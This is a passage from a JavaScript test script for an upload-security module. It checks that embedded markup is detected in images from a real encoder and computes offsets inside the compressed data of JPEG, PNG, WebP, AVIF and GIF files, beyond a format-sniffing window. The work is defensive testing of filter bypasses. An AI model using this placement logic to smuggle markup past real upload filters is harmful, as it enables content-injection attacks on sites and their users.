        assert.equal(security.containsEmbeddedMarkup(copy), true)
      })
    }
  }
  check('mif1-major AVIF from a real encoder', () => {
    const data = new Uint8Array(outputs.find(([label]) => label === 'AVIF')[2])
    const copy = data.slice(); copy.set(enc('mif1'), 8)
    assert.equal(security.detectUploadFormat(copy).mime, 'image/avif')
  })
  console.log(`PASS real encoder output: ${outputs.length} files, ${(total / 1048576).toFixed(1)} MB (sharp ${sharp.versions.sharp})`)
}

// An offset in the middle of the largest compressed region, past the
// sniffing window (PAST_WINDOW), not right after a JPEG 0xFF and inside one
// GIF sub-block.
function compressedOffset(label, data) {
  const find = (text, from = 0) => Buffer.from(data.buffer, data.byteOffset, data.length).indexOf(text, from)
  if (/^JPEG/.test(label)) {
    const scans = []
    for (let offset = 2; offset + 4 <= data.length;) {
      if (data[offset] !== 0xff) break
      while (data[offset] === 0xff) offset += 1
      const marker = data[offset++]
      if (marker === 0xd9) break
      if ((marker >= 0xd0 && marker <= 0xd8) || marker === 0x01) continue
      offset += (data[offset] << 8) | data[offset + 1]
      if (marker !== 0xda) continue
      let end = offset
      for (;;) {
        end = data.indexOf(0xff, end)
        if (end < 0 || end + 1 >= data.length) { end = data.length; break }
        const next = data[end + 1]
        if (next === 0 || (next >= 0xd0 && next <= 0xd7)) end += 2
        else if (next === 0xff) end += 1
        else break
      }
      scans.push({ start: offset, end })
      offset = end
    }
    const largest = scans.sort((a, b) => (b.end - b.start) - (a.end - a.start))[0]
    if (!largest) return -1
    let at = Math.max(PAST_WINDOW, (largest.start + largest.end) >> 1)
    while (at < largest.end - 16 && data[at - 1] === 0xff) at += 1
    return at < largest.end - 16 ? at : -1
  }
  if (/^PNG/.test(label)) {
    const chunk = pngChunks(data).filter((c) => c.type === 'IDAT').sort((a, b) => b.length - a.length)[0]
    return chunk ? Math.max(PAST_WINDOW, chunk.dataStart + (chunk.length >> 1)) : -1
  }
  if (/^WebP/.test(label)) {
    let vp8 = find('VP8 ')
    if (vp8 < 0) vp8 = find('VP8L')
    if (vp8 < 0) return -1
    const size = data[vp8 + 4] | (data[vp8 + 5] << 8) | (data[vp8 + 6] << 16) | (data[vp8 + 7] * 0x1000000)
    return Math.max(PAST_WINDOW, vp8 + 8 + (size >> 1))
  }
  if (/^AVIF/.test(label)) {
    const mdat = find('mdat')
    if (mdat < 4) return -1
    const size = ((data[mdat - 4] << 24) >>> 0) + (data[mdat - 3] << 16) + (data[mdat - 2] << 8) + data[mdat - 1]
    return Math.max(PAST_WINDOW, mdat + 4 + (size >> 1))
  }
  if (/^GIF/.test(label)) {
    let offset = 13 + (data[10] & 0x80 ? 3 * (1 << ((data[10] & 7) + 1)) : 0)
    while (offset < data.length && data[offset] === 0x21) { offset += 2; while (data[offset]) offset += data[offset] + 1; offset += 1 }
    if (data[offset] !== 0x2c) return -1
    offset += 10 + (data[offset + 9] & 0x80 ? 3 * (1 << ((data[offset + 9] & 7) + 1)) : 0) + 1
    const blocks = []
    while (offset < data.length && data[offset] !== 0) { blocks.push({ start: offset + 1, size: data[offset] }); offset += data[offset] + 1 }
    const block = blocks.filter((b) => b.start >= PAST_WINDOW && b.size >= 32)[Math.floor(blocks.length / 3)] || blocks.find((b) => b.start >= PAST_WINDOW && b.size >= 32)
    return block ? block.start + 8 : -1
  }
  return -1
}

sharpSection().then(() => {
  console.log(`repo images checked: ${repoImages.length} (${Object.entries(repoFormats).map(([k, v]) => `${k} ${v}`).join(', ')})`)
  if (failures.length) {
    for (const failure of failures) console.error(`FAIL ${failure}`)
    console.error(`${failures.length} of ${checks} checks failed`)
    process.exitCode = 1
    return
  }
  console.log(`PASS ${checks} checks: refuter bypasses caught in every carrier, brand allowlist, QuickTime atoms, no false positives on real or synthetic images`)
}).catch((error) => { console.error(error); process.exitCode = 1 })
